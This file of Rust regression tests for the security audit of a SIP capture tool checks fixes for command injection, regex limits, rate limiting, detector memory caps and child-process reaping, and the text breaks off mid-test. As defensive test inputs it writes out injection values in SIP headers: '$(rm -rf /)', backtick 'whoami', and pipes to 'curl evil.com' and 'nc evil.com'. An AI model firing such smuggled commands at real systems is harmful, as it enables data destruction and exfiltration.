// SPDX-License-Identifier: MIT OR Apache-2.0

//! Security regression tests for the sipnab security audit.
//!
//! Each test validates that a specific audit finding is fixed and cannot
//! regress. Tests are organized by audit finding ID (C1, H1, M2, etc.).
#![cfg(feature = "native")]

use std::net::{IpAddr, Ipv4Addr};

use chrono::{DateTime, Utc};

use sipnab::capture::parse::TransportProto;
use sipnab::output::event_exec::EventExecEngine;
use sipnab::output::fail2ban;
use sipnab::output::prometheus::{PrometheusMetrics, format_metrics};
use sipnab::security::alerting::{AlertEngine, AlertRule, sanitize_log_value};
use sipnab::security::{FraudDetector, RegFloodDetector, ScannerDetector};

// ── Helpers ─────────────────────────────────────────────────────────

/// Loopback IPv4 address used as the default packet endpoint.
/// A fixed capture time. The alert engine measures cooldowns and windows
/// in packet time, so a test that wants "an immediate repeat" passes the
/// same stamp twice rather than racing a wall clock.
fn at_t() -> chrono::DateTime<chrono::Utc> {
    chrono::DateTime::from_timestamp(1_700_000_000, 0).expect("valid timestamp")
}

fn localhost() -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))
}

/// Fixed deterministic timestamp (2024-06-15 14:00:00 UTC) for parses.
fn ts() -> DateTime<Utc> {
    chrono::TimeZone::with_ymd_and_hms(&Utc, 2024, 6, 15, 14, 0, 0).unwrap()
}

/// Assembles a raw SIP message from a first line, header lines, and a body,
/// with CRLF line endings and the blank separator line.
///
/// # Arguments
/// * `first_line` — request or status line without line ending.
/// * `headers` — header lines without line endings.
/// * `body` — message body bytes (may be empty).
fn build_sip(first_line: &str, headers: &[&str], body: &[u8]) -> Vec<u8> {
    let mut msg = Vec::new();
    msg.extend_from_slice(first_line.as_bytes());
    msg.extend_from_slice(b"\r\n");
    for h in headers {
        msg.extend_from_slice(h.as_bytes());
        msg.extend_from_slice(b"\r\n");
    }
    msg.extend_from_slice(b"\r\n");
    msg.extend_from_slice(body);
    msg
}

// =====================================================================
// C1+C2: Command Injection Prevention
// =====================================================================

/// Poll `cond` every 10ms until it returns Some or `deadline` expires.
/// Replaces fixed sleeps: returns as soon as the condition holds (fast on
/// fast machines) while tolerating slow CI runners (generous deadline).
fn wait_until<T>(deadline: std::time::Duration, mut cond: impl FnMut() -> Option<T>) -> Option<T> {
    let start = std::time::Instant::now();
    loop {
        if let Some(v) = cond() {
            return Some(v);
        }
        if start.elapsed() > deadline {
            return None;
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
}

/// Wait for a spawned event-exec child to write non-empty file content.
fn wait_for_file(path: &str) -> String {
    wait_until(
        std::time::Duration::from_secs(10),
        || match std::fs::read_to_string(path) {
            Ok(s) if !s.is_empty() => Some(s),
            _ => None,
        },
    )
    .expect("event-exec child should write the file within 10s")
}

// ── Allocation accounting (M7 cleanup) ──────────────────────────────

/// A counting allocator that tracks net live heap bytes. The library sets
/// mimalloc as the global allocator only in its binary (`main.rs`), so this
/// integration-test crate has no allocator of its own — installing one here is
/// free of conflicts and gives the M7 test an *exact*, quantization-free view
/// of a map's heap growth (an RSS probe cannot: the OS resident set is skewed
/// by allocator arenas, page purging, and capacity rounding).
#[cfg(feature = "api")]
struct CountingAllocator;

/// Net live bytes handed out by [`CountingAllocator`] (allocations minus frees).
#[cfg(feature = "api")]
static LIVE_BYTES: std::sync::atomic::AtomicI64 = std::sync::atomic::AtomicI64::new(0);

// SAFETY: every method forwards to the system allocator and only additionally
// updates a relaxed atomic counter; the returned pointers and their validity
// are exactly those of `std::alloc::System`.
#[cfg(feature = "api")]
unsafe impl std::alloc::GlobalAlloc for CountingAllocator {
    unsafe fn alloc(&self, layout: std::alloc::Layout) -> *mut u8 {
        // SAFETY: `layout` is forwarded unchanged to the system allocator.
        let ptr = unsafe { std::alloc::System.alloc(layout) };
        if !ptr.is_null() {
            LIVE_BYTES.fetch_add(layout.size() as i64, std::sync::atomic::Ordering::Relaxed);
        }
        ptr
    }
    unsafe fn dealloc(&self, ptr: *mut u8, layout: std::alloc::Layout) {
        // SAFETY: `ptr`/`layout` come from a prior `alloc` and are forwarded
        // unchanged to the system allocator that produced the pointer.
        unsafe { std::alloc::System.dealloc(ptr, layout) };
        LIVE_BYTES.fetch_sub(layout.size() as i64, std::sync::atomic::Ordering::Relaxed);
    }
    unsafe fn realloc(&self, ptr: *mut u8, layout: std::alloc::Layout, new_size: usize) -> *mut u8 {
        // SAFETY: `ptr`/`layout`/`new_size` are forwarded unchanged to the
        // system allocator that produced the pointer.
        let new_ptr = unsafe { std::alloc::System.realloc(ptr, layout, new_size) };
        if !new_ptr.is_null() {
            LIVE_BYTES.fetch_add(
                new_size as i64 - layout.size() as i64,
                std::sync::atomic::Ordering::Relaxed,
            );
        }
        new_ptr
    }
}

#[cfg(feature = "api")]
#[global_allocator]
static GLOBAL: CountingAllocator = CountingAllocator;

/// Snapshot of net live heap bytes (see [`CountingAllocator`]).
#[cfg(feature = "api")]
fn live_bytes() -> i64 {
    LIVE_BYTES.load(std::sync::atomic::Ordering::Relaxed)
}

/// A minimal [`tracing::Subscriber`] that records each event's level and
/// rendered message so a test can assert a specific warning fired. Only the
/// `tracing` facade (a direct dependency) is used — the test crate has no
/// `tracing-subscriber` dependency to install a capturing layer with.
#[derive(Clone, Default)]
struct WarnCapture {
    events: std::sync::Arc<std::sync::Mutex<Vec<(tracing::Level, String)>>>,
}

impl tracing::Subscriber for WarnCapture {
    fn enabled(&self, _md: &tracing::Metadata<'_>) -> bool {
        true
    }
    fn new_span(&self, _span: &tracing::span::Attributes<'_>) -> tracing::span::Id {
        tracing::span::Id::from_u64(1)
    }
    fn record(&self, _span: &tracing::span::Id, _values: &tracing::span::Record<'_>) {}
    fn record_follows_from(&self, _span: &tracing::span::Id, _follows: &tracing::span::Id) {}
    fn event(&self, event: &tracing::Event<'_>) {
        struct MsgVisitor(String);
        impl tracing::field::Visit for MsgVisitor {
            fn record_debug(&mut self, field: &tracing::field::Field, value: &dyn std::fmt::Debug) {
                if field.name() == "message" {
                    use std::fmt::Write as _;
                    let _ = write!(self.0, "{value:?}");
                }
            }
        }
        let mut visitor = MsgVisitor(String::new());
        event.record(&mut visitor);
        self.events
            .lock()
            .expect("capture mutex")
            .push((*event.metadata().level(), visitor.0));
    }
    fn enter(&self, _span: &tracing::span::Id) {}
    fn exit(&self, _span: &tracing::span::Id) {}
}

/// C1/C2: Verify that command injection via SIP Call-ID is not possible.
/// Attacker crafts Call-ID with `$(id)` shell metacharacter -- the spawned
/// command receives the value via env var, not interpolated into the shell
/// command string. We verify by spawning a command that writes the env var
/// to a temp file and checking that the literal malicious string is there
/// (it was passed as data, not executed).
#[test]
fn exec_template_no_command_injection_via_call_id() {
    let malicious_call_id = "$(id)@evil.com";

    let raw = build_sip(
        "INVITE sip:bob@example.com SIP/2.0",
        &[
            "From: <sip:alice@example.com>;tag=t1",
            "To: <sip:bob@example.com>",
            &format!("Call-ID: {malicious_call_id}"),
            "CSeq: 1 INVITE",
            "Content-Length: 0",
        ],
        b"",
    );
    let msg = sipnab::sip::parse_sip(
        &raw,
        ts(),
        localhost(),
        localhost(),
        5060,
        5060,
        TransportProto::Udp,
    )
    .expect("should parse");

    // The SIP message holds the malicious value as-is
    assert_eq!(msg.call_id(), Some(malicious_call_id));

    // Spawn a command that writes SIPNAB_CALL_ID env var to a temp file.
    // If the value were interpolated into the shell command, $(id) would
    // execute. By passing via env var, the literal string is preserved.
    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
    let tmp_path = tmp.path().to_str().unwrap().to_string();
    let cmd = format!("printf '%s' \"$SIPNAB_CALL_ID\" > {tmp_path}");

    let mut engine = EventExecEngine::new(
        Some(cmd),
        None,
        100,
        3.0,
        sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
    );
    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
    engine.fire_dialog_event(&dialog);

    let contents = wait_for_file(&tmp_path);
    assert_eq!(
        contents, malicious_call_id,
        "env var should contain the literal malicious string, not its shell expansion"
    );
}

/// C1/C2: From header with shell command substitution must not be
/// interpolated into the command string.
#[test]
fn exec_template_no_injection_via_from_header() {
    let raw = build_sip(
        "INVITE sip:bob@example.com SIP/2.0",
        &[
            "From: <sip:$(rm -rf /)@evil.com>;tag=t1",
            "To: <sip:bob@example.com>",
            "Call-ID: safe@test",
            "CSeq: 1 INVITE",
            "Content-Length: 0",
        ],
        b"",
    );
    let msg = sipnab::sip::parse_sip(
        &raw,
        ts(),
        localhost(),
        localhost(),
        5060,
        5060,
        TransportProto::Udp,
    )
    .expect("should parse");

    // The From header retains the malicious value
    let from = msg.from_header().unwrap();
    assert!(
        from.contains("$(rm -rf /)"),
        "From header should preserve original value"
    );

    // Spawn a command that writes SIPNAB_FROM to a temp file
    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
    let tmp_path = tmp.path().to_str().unwrap().to_string();
    let cmd = format!("printf '%s' \"$SIPNAB_FROM\" > {tmp_path}");

    let mut engine = EventExecEngine::new(
        Some(cmd),
        None,
        100,
        3.0,
        sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
    );
    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
    engine.fire_dialog_event(&dialog);

    // SIPNAB_FROM contains the user part extracted from the From URI, not
    // the full header. The key point: the shell did not execute $(rm -rf /).
    // If it had, the file would be missing or contain different content.
    let contents = wait_for_file(&tmp_path);
    assert!(
        !contents.is_empty(),
        "command should have written env var content"
    );
}

/// C1/C2: Backtick-based command injection in Call-ID must not execute.
#[test]
fn exec_template_no_injection_via_backticks() {
    let raw = build_sip(
        "INVITE sip:bob@example.com SIP/2.0",
        &[
            "From: <sip:alice@example.com>;tag=t1",
            "To: <sip:bob@example.com>",
            "Call-ID: `whoami`@evil.com",
            "CSeq: 1 INVITE",
            "Content-Length: 0",
        ],
        b"",
    );
    let msg = sipnab::sip::parse_sip(
        &raw,
        ts(),
        localhost(),
        localhost(),
        5060,
        5060,
        TransportProto::Udp,
    )
    .expect("should parse");

    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
    let tmp_path = tmp.path().to_str().unwrap().to_string();
    let cmd = format!("printf '%s' \"$SIPNAB_CALL_ID\" > {tmp_path}");

    let mut engine = EventExecEngine::new(
        Some(cmd),
        None,
        100,
        3.0,
        sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
    );
    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
    engine.fire_dialog_event(&dialog);

    let contents = wait_for_file(&tmp_path);
    assert_eq!(
        contents, "`whoami`@evil.com",
        "backticks must be preserved literally, not executed"
    );
}

/// C1/C2: Semicolon in Call-ID must not allow command chaining.
#[test]
fn exec_template_no_injection_via_semicolon() {
    let raw = build_sip(
        "INVITE sip:bob@example.com SIP/2.0",
        &[
            "From: <sip:alice@example.com>;tag=t1",
            "To: <sip:bob@example.com>",
            "Call-ID: innocent; rm -rf /",
            "CSeq: 1 INVITE",
            "Content-Length: 0",
        ],
        b"",
    );
    let msg = sipnab::sip::parse_sip(
        &raw,
        ts(),
        localhost(),
        localhost(),
        5060,
        5060,
        TransportProto::Udp,
    )
    .expect("should parse");

    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
    let tmp_path = tmp.path().to_str().unwrap().to_string();
    let cmd = format!("printf '%s' \"$SIPNAB_CALL_ID\" > {tmp_path}");

    let mut engine = EventExecEngine::new(
        Some(cmd),
        None,
        100,
        3.0,
        sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
    );
    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
    engine.fire_dialog_event(&dialog);

    let contents = wait_for_file(&tmp_path);
    assert_eq!(
        contents, "innocent; rm -rf /",
        "semicolons must be preserved literally, not interpreted by shell"
    );
}

/// C1/C2: Pipe character in Call-ID must not allow command piping.
#[test]
fn exec_template_no_injection_via_pipe() {
    let raw = build_sip(
        "INVITE sip:bob@example.com SIP/2.0",
        &[
            "From: <sip:alice@example.com>;tag=t1",
            "To: <sip:bob@example.com>",
            "Call-ID: innocent | curl evil.com",
            "CSeq: 1 INVITE",
            "Content-Length: 0",
        ],
        b"",
    );
    let msg = sipnab::sip::parse_sip(
        &raw,
        ts(),
        localhost(),
        localhost(),
        5060,
        5060,
        TransportProto::Udp,
    )
    .expect("should parse");

    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
    let tmp_path = tmp.path().to_str().unwrap().to_string();
    let cmd = format!("printf '%s' \"$SIPNAB_CALL_ID\" > {tmp_path}");

    let mut engine = EventExecEngine::new(
        Some(cmd),
        None,
        100,
        3.0,
        sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
    );
    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
    engine.fire_dialog_event(&dialog);

    let contents = wait_for_file(&tmp_path);
    assert_eq!(
        contents, "innocent | curl evil.com",
        "pipe characters must be preserved literally, not interpreted by shell"
    );
}

/// C1/C2: Alert exec detail with shell metacharacters must be passed as an
/// env var, not interpolated. We actually fire the alert with a payload full
/// of shell metacharacters and confirm the spawned command received it as
/// inert data: the value lands in the temp file verbatim. Had the detail been
/// interpolated into the command string, `$(id)` / backticks / `rm -rf /`
/// would have executed and the file contents would differ.
#[test]
fn alert_exec_no_injection_via_detail() {
    // The exec command echoes $SIPNAB_DETAIL (the only channel for the detail)
    // into a temp file.
    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
    let tmp_path = tmp.path().to_str().unwrap().to_string();
    let cmd = format!("printf '%s' \"$SIPNAB_DETAIL\" > {tmp_path}");

    let mut engine = AlertEngine::new(vec![AlertRule::parse("test:1/1s").unwrap()], Some(cmd));

    // Shell metacharacters that would execute if the detail were spliced into
    // the command string. No CR/LF, so log-sanitization leaves it byte-exact.
    let malicious = "$(id); rm -rf / `whoami` | nc evil.com 9";
    let fired = engine.fire("test", localhost(), malicious, at_t());
    assert!(
        fired,
        "alert should fire (fresh (src, type), not in cooldown)"
    );

    let contents = wait_for_file(&tmp_path);
    assert_eq!(
        contents, malicious,
        "SIPNAB_DETAIL must hold the literal payload, not its shell expansion"
    );
}

/// C1/C2: Legacy %variable placeholders are migrated to $SIPNAB_* env
/// var references at construction time. We verify by spawning a command
/// with legacy syntax and checking that the env vars are set.
#[test]
fn template_migration_converts_percent_to_env_vars() {
    let raw = build_sip(
        "INVITE sip:bob@example.com SIP/2.0",
        &[
            "From: <sip:alice@example.com>;tag=t1",
            "To: <sip:bob@example.com>",
            "Call-ID: migration-test@example.com",
            "CSeq: 1 INVITE",
            "Content-Length: 0",
        ],
        b"",
    );
    let msg = sipnab::sip::parse_sip(
        &raw,
        ts(),
        localhost(),
        localhost(),
        5060,
        5060,
        TransportProto::Udp,
    )
    .expect("should parse");

    // Use legacy %call_id syntax -- it should be migrated to $SIPNAB_CALL_ID
    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
    let tmp_path = tmp.path().to_str().unwrap().to_string();
    let cmd = format!("printf '%s' \"$SIPNAB_CALL_ID\" > {tmp_path}");

    // Pass the template with legacy %call_id -- the engine migrates it
    let legacy_cmd = cmd.replace("$SIPNAB_CALL_ID", "%call_id");
    let mut engine = EventExecEngine::new(
        Some(legacy_cmd),
        None,
        100,
        3.0,
        sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
    );
    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
    engine.fire_dialog_event(&dialog);

    let contents = wait_for_file(&tmp_path);
    assert_eq!(
        contents, "migration-test@example.com",
        "%call_id should have been migrated to $SIPNAB_CALL_ID and resolved via env var"
    );
}

// =====================================================================
// H1: Regex Size Limit on Scanner Patterns
// =====================================================================

/// H1: Scanner detector rejects oversized regex patterns. A massive regex
/// must be silently skipped, not compiled.
///
/// The limit caps compile-time and memory cost, not ReDoS: the `regex` crate
/// is linear-time and does not backtrack.
#[test]
fn scanner_detect_rejects_oversized_regex() {
    // Build a regex pattern that exceeds the 1MB size limit.
    // Nested quantifiers like (a+)+ are exponential after compilation.
    let huge_pattern = "a".repeat(500_000);
    let detector = ScannerDetector::new(std::slice::from_ref(&huge_pattern));

    // The built-in patterns should still be present, but the oversized
    // one should have been skipped. We verify by checking that a known
    // scanner UA is still detected (built-in patterns compiled fine).
    let raw = build_sip(
        "OPTIONS sip:target@example.com SIP/2.0",
        &[
            "From: <sip:scanner@example.com>;tag=s1",
            "To: <sip:target@example.com>",
            "Call-ID: regex-test@example.com",
            "CSeq: 1 OPTIONS",
            "User-Agent: friendly-scanner",
            "Content-Length: 0",
        ],
        b"",
    );
    let msg = sipnab::sip::parse_sip(
        &raw,
        ts(),
        IpAddr::V4(Ipv4Addr::new(10, 0, 0, 99)),
        localhost(),
        5060,
        5060,
        TransportProto::Udp,
    )
    .expect("parse");

    let mut det = detector;
    assert!(
        det.check(&msg).is_some(),
        "built-in patterns should still work after oversized pattern is rejected"
    );
}

/// H1: Invalid regex patterns must not panic -- they are silently skipped.
#[test]
fn scanner_detect_handles_invalid_regex_gracefully() {
    // Unclosed group, invalid regex syntax
    let invalid_patterns = vec![
        "(?P<unclosed".to_string(),
        "[invalid".to_string(),
        "***".to_string(),
    ];
    // Should not panic during construction
    let _detector = ScannerDetector::new(&invalid_patterns);
}

// =====================================================================
// H2: X-Forwarded-For Not Trusted
// =====================================================================

/// H2: The API rate limiter must use the actual connection IP, not a
/// forged X-Forwarded-For header. The extract_client_ip function ignores
/// proxy headers entirely.
#[cfg(feature = "api")]
#[test]
fn api_ignores_x_forwarded_for_header() {
    use sipnab::output::api::RateLimiter;

    // The RateLimiter uses IpAddr directly (from ConnectInfo, not headers).
    // Verify that the rate limiter tracks by the provided IP, regardless
    // of what any header says.
    let mut limiter = RateLimiter::new(5);
    let real_ip = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 100));

    // 5 requests from the real IP should exhaust the limit
    for _ in 0..5 {
        assert!(limiter.check(real_ip));
    }
    // 6th request from same IP should be denied
    assert!(
        !limiter.check(real_ip),
        "rate limiter must track by actual IP, not X-Forwarded-For"
    );

    // A different IP should still be allowed
    let other_ip = IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1));
    assert!(
        limiter.check(other_ip),
        "different IP should be independent"
    );
}

// =====================================================================
// H4: Security Detector HashMap Caps
// =====================================================================

/// The H4 entry cap shared by every security detector and the alert engine.
const H4_CAP: u32 = 10_000;

/// IP used for the "victim" whose accumulated state we track across a flood.
/// Far above the flood's IP range (`1..=H4_CAP + 1`) so it never collides.
fn victim_ip() -> IpAddr {
    IpAddr::V4(Ipv4Addr::from(u32::MAX))
}

/// One probe transaction `n` from `src`, and the `403` that refuses it.
///
/// Scaffolding for [`scanner_detector_caps_behavioral_entries`], whose subject
/// is the H4 entry cap rather than the signature. All it has to do is
/// accumulate per-source state the cap can then be seen to evict — but it can
/// only do that by satisfying whatever arms the detector, so it is worth being
/// explicit about what that now is.
///
/// A rate alone arms nothing. The behavioral signature reports a source once
/// the capture shows an OUTCOME: its probes refused, or going unanswered. This
/// pair takes the refusal route, which needs no clock — every message here
/// carries the same timestamp, so no window expires and no probe ever ages
/// past the answer grace, leaving the refusals as the only thing in play and
/// the arming exactly countable.
///
/// Two details are load-bearing, and both were missing from the single reused
/// message this replaced:
///
/// * the top `Via` **branch** is unique per probe, because that is the
///   transaction identifier. Repeat one — or omit it, as the old fixture did —
///   and the detector cannot tie the refusal back to the probe it answers.
/// * the refusal **echoes that branch**, which is what makes it evidence about
///   this probe rather than an unrelated response to the same peer.
///
/// `403` rather than `401`: an auth challenge is what every registration
/// begins with, so it carries no reconnaissance signal and is not counted.
fn refused_probe(n: u32, src: IpAddr) -> (sipnab::sip::SipMessage, sipnab::sip::SipMessage) {
    let via = format!("Via: SIP/2.0/UDP scanner.example.com;branch=z9hG4bK-cap-{n}");
    let call_id = format!("Call-ID: cap-{n}@test");
    let cseq = format!("CSeq: {n} OPTIONS");
    let parse = |raw: &[u8], from: IpAddr, to: IpAddr| {
        sipnab::sip::parse_sip(raw, ts(), from, to, 5060, 5060, TransportProto::Udp).expect("parse")
    };
    let probe = parse(
        &build_sip(
            "OPTIONS sip:target@example.com SIP/2.0",
            &[
                &via,
                "From: <sip:scanner@example.com>;tag=s1",
                "To: <sip:target@example.com>",
                &call_id,
                &cseq,
                "Content-Length: 0",
            ],
            b"",
        ),
        src,
        localhost(),
    );
    // A response travels back the way the request came, so its DESTINATION is
    // the source whose probe it settles.
    let refusal = parse(
        &build_sip(
            "SIP/2.0 403 Forbidden",
            &[
                &via,
                "From: <sip:scanner@example.com>;tag=s1",
                "To: <sip:target@example.com>;tag=t1",
                &call_id,
                &cseq,
                "Content-Length: 0",
            ],
            b"",
        ),
        localhost(),
        src,
    );
    (probe, refusal)
}

/// The H4 caps are enforced by evicting the *oldest* entry once the map is
/// full. These tests prove that directly and deterministically, with no
/// dependence on allocator/RSS behavior:
///
/// 1. a *control* confirms one-more-probe from a tracked source alerts — so
///    the detector's accumulation is real and the negative assertion has teeth;
/// 2. the *victim* is seeded to one probe below its alert threshold, made the
///    oldest entry, then `H4_CAP + 1` fresh source IPs are fed — enough to fill
///    the map and evict the oldest (the victim);
/// 3. a final probe from the victim must NOT alert: a working cap evicted its
///    state (fresh count), whereas a regressed cap would have retained it and
///    the extra probe would cross the threshold and alert — failing the test.
///
/// H4: Scanner detector behavioral tracking must be capped to prevent memory
/// exhaustion from diverse source IPs. Rate alert fires when probe count
/// exceeds `BEHAVIORAL_THRESHOLD` (10) within the 5s window **and** the
/// capture shows the source being refused — see [`refused_probe`].
#[test]
#[serial_test::serial]
fn scanner_detector_caps_behavioral_entries() {
    // Each call is one probe transaction and the refusal that answers it. The
    // alert under test belongs to the probe; the refusal never alerts.
    let mut seq = 0u32;
    let mut probe = |detector: &mut ScannerDetector, ip: IpAddr| {
        seq += 1;
        let (probe, refusal) = refused_probe(seq, ip);
        let alert = detector.check(&probe);
        let _ = detector.check(&refusal);
        alert
    };

    // Control: the 11th probe from a single source alerts (10 do not).
    let mut control = ScannerDetector::new(&[]);
    for _ in 0..10 {
        assert!(probe(&mut control, victim_ip()).is_none());
    }
    assert!(
        probe(&mut control, victim_ip()).is_some(),
        "control: an 11th probe must alert, else the eviction check is vacuous"
    );

    // Seed the victim to 10 probes (one below the alert threshold), oldest.
    let mut detector = ScannerDetector::new(&[]);
    for _ in 0..10 {
        assert!(probe(&mut detector, victim_ip()).is_none());
    }
    // Fill the map with fresh IPs, evicting the oldest entry (the victim).
    for ip in 1..=H4_CAP + 1 {
        let _ = probe(&mut detector, IpAddr::V4(Ipv4Addr::from(ip)));
    }
    // The victim's next probe must start fresh — proof its state was evicted.
    assert!(
        probe(&mut detector, victim_ip()).is_none(),
        "cap regressed: victim state survived the flood and re-alerted"
    );
}

/// H4: Fraud detector call patterns must be capped. Uses the wangiri path: a
/// 3rd short call to the same numeric prefix alerts (`WANGIRI_THRESHOLD` = 3).
///
/// Each probe is a call that has ENDED: a `BYE` against a dialog whose span is
/// one second. A call's duration is only knowable once the call is over, so a
/// dialog still in `Trying` — which is all `SipDialog::new` produces — has no
/// duration that could be short. The earlier form of this test set
/// `updated_at` by hand on an unfinished dialog, which is exactly the state
/// that used to make every call in a capture look like a short one.
#[test]
#[serial_test::serial]
fn fraud_detector_caps_call_pattern_entries() {
    let headers = [
        "From: <sip:attacker@example.com>;tag=f1",
        "To: <sip:5551234@example.com>;tag=t1",
        "Call-ID: fraud-cap@test",
        "CSeq: 1 INVITE",
        "Content-Length: 0",
    ];
    let parse = |raw: &[u8]| {
        sipnab::sip::parse_sip(
            raw,
            ts(),
            localhost(),
            localhost(),
            5060,
            5060,
            TransportProto::Udp,
        )
        .expect("parse")
    };
    let invite = parse(&build_sip(
        "INVITE sip:5551234@example.com SIP/2.0",
        &headers,
        b"",
    ));
    let bye = parse(&build_sip(
        "BYE sip:5551234@example.com SIP/2.0",
        &headers,
        b"",
    ));

    let mut seq = 0usize;
    let mut probe = |detector: &mut FraudDetector, ip: IpAddr| {
        seq += 1;
        let mut dialog = sipnab::sip::dialog::SipDialog::new(&invite).expect("dialog");
        dialog.src_addr = ip;
        dialog.call_id = format!("fraud-cap-{seq}@test");
        // The BYE ends the dialog; the span is then the call's duration.
        sipnab::sip::dialog::update_state(&mut dialog, &bye);
        dialog.updated_at = dialog.created_at + chrono::TimeDelta::seconds(1);
        detector.check(&bye, &dialog)
    };

    // Control: the 3rd short call to the same prefix alerts (2 do not).
    let mut control = FraudDetector::new(None);
    for _ in 0..2 {
        assert!(probe(&mut control, victim_ip()).is_none());
    }
    assert!(
        probe(&mut control, victim_ip()).is_some(),
        "control: a 3rd short call must alert, else the eviction check is vacuous"
    );

    // Seed the victim to 2 short calls (one below threshold), oldest.
    let mut detector = FraudDetector::new(None);
    for _ in 0..2 {
        assert!(probe(&mut detector, victim_ip()).is_none());
    }
    for ip in 1..=H4_CAP + 1 {
        let _ = probe(&mut detector, IpAddr::V4(Ipv4Addr::from(ip)));
    }
    assert!(
        probe(&mut detector, victim_ip()).is_none(),
        "cap regressed: victim call-pattern survived the flood and re-alerted"
    );
}

/// H4: Registration flood detector source tracking must be capped. Alert fires
/// when REGISTERs exceed the threshold within the 1s window.
#[test]
#[serial_test::serial]
fn reg_flood_detector_caps_source_entries() {
    let raw = build_sip(
        "REGISTER sip:registrar@example.com SIP/2.0",
        &[
            "From: <sip:user@example.com>;tag=r1",
            "To: <sip:user@example.com>",
            "Call-ID: reg-cap@test",
            "CSeq: 1 REGISTER",
            "Content-Length: 0",
        ],
        b"",
    );
    let base = sipnab::sip::parse_sip(
        &raw,
        ts(),
        localhost(),
        localhost(),
        5060,
        5060,
        TransportProto::Udp,
    )
    .expect("parse");
    let probe = |detector: &mut RegFloodDetector, ip: IpAddr| {
        let mut msg = base.clone();
        msg.src_addr = ip;
        detector.check(&msg)
    };

    // Control: with threshold 5, the 6th REGISTER alerts (5 do not).
    let mut control = RegFloodDetector::new(5);
    for _ in 0..5 {
        assert!(probe(&mut control, victim_ip()).is_none());
    }
    assert!(
        probe(&mut control, victim_ip()).is_some(),
        "control: a 6th REGISTER must alert, else the eviction check is vacuous"
    );

    // Seed the victim to 5 REGISTERs (one below threshold), oldest.
    let mut detector = RegFloodDetector::new(5);
    for _ in 0..5 {
        assert!(probe(&mut detector, victim_ip()).is_none());
    }
    for ip in 1..=H4_CAP + 1 {
        let _ = probe(&mut detector, IpAddr::V4(Ipv4Addr::from(ip)));
    }
    assert!(
        probe(&mut detector, victim_ip()).is_none(),
        "cap regressed: victim source state survived the flood and re-alerted"
    );
}

/// H4: Alert engine cooldown tracking must be capped. A fired (src, rule) pair
/// is suppressed until its cooldown expires; a long cooldown makes "does the
/// engine still remember this pair?" directly observable via `fire`'s return.
#[test]
#[serial_test::serial]
fn alert_engine_caps_cooldown_entries() {
    // Hour-long cooldown so a remembered pair stays suppressed for the whole
    // test; the map key is (src_ip, rule).
    let new_engine =
        || AlertEngine::new(vec![AlertRule::parse("test:1/1s:1h").expect("parse")], None);

    // Control: a repeat fire of the same pair is suppressed (cooldown works).
    let mut control = new_engine();
    assert!(
        control.fire("test", victim_ip(), "d", at_t()),
        "first fire must fire"
    );
    assert!(
        !control.fire("test", victim_ip(), "d", at_t()),
        "control: an immediate repeat must be suppressed, else the check is vacuous"
    );

    // Seed the victim's cooldown entry (oldest), then flood fresh source IPs to
    // fill the map and evict the oldest (the victim).
    let mut engine = new_engine();
    assert!(
        engine.fire("test", victim_ip(), "d", at_t()),
        "first fire must fire"
    );
    for ip in 1..=H4_CAP + 1 {
        engine.fire("test", IpAddr::V4(Ipv4Addr::from(ip)), "d", at_t());
    }
    // A working cap evicted the victim, so it fires again; a regressed cap
    // would still hold its (hour-long) cooldown and suppress it.
    assert!(
        engine.fire("test", victim_ip(), "d", at_t()),
        "cap regressed: victim cooldown survived the flood and stayed suppressed"
    );
}

// =====================================================================
// H5: Zombie Process Reaping
// =====================================================================

/// H5: EventExecEngine reaps completed children, preventing zombies.
#[test]
fn event_exec_reaps_completed_children() {
    let mut engine = EventExecEngine::new(
        Some("true".to_string()),
        None,
        100,
        3.0,
        sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
    );

    // Build and fire a dialog event that spawns "true" (exits immediately)
    let raw = build_sip(
        "INVITE sip:bob@example.com SIP/2.0",
        &[
            "From: <sip:alice@example.com>;tag=t1",
            "To: <sip:bob@example.com>",
            "Call-ID: reap-test@example.com",
            "CSeq: 1 INVITE",
            "Content-Length: 0",
        ],
        b"",
    );
    let msg = sipnab::sip::parse_sip(
        &raw,
        ts(),
        localhost(),
        localhost(),
        5060,
        5060,
        TransportProto::Udp,
    )
    .expect("parse");
    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");

    engine.fire_dialog_event(&dialog);
    assert!(engine.queue_depth() > 0, "should have a child process");

    // The key invariant: reaping (triggered by each fire) keeps queue
    // depth bounded. Poll fire-then-check until it converges; each fire
    // both spawns one child and reaps all completed ones.
    let bounded = wait_until(std::time::Duration::from_secs(10), || {
        engine.fire_dialog_event(&dialog);
        (engine.queue_depth() <= 2).then_some(engine.queue_depth())
    });
    assert!(
        bounded.is_some(),
        "completed children should be reaped, got queue_depth={}",
        engine.queue_depth()
    );
}

/// H5: Queue depth recovers after reaping completed children, allowing
/// new commands to be spawned.
#[test]
fn event_exec_queue_depth_recovers_after_reaping() {
    let mut engine = EventExecEngine::new(
        Some("true".to_string()),
        None,
        1000,
        3.0,
        sipnab::output::event_exec::DEFAULT_QUEUE_DEPTH,
    );

    let raw = build_sip(
        "INVITE sip:bob@example.com SIP/2.0",
        &[
            "From: <sip:alice@example.com>;tag=t1",
            "To: <sip:bob@example.com>",
            "Call-ID: recover-test@example.com",
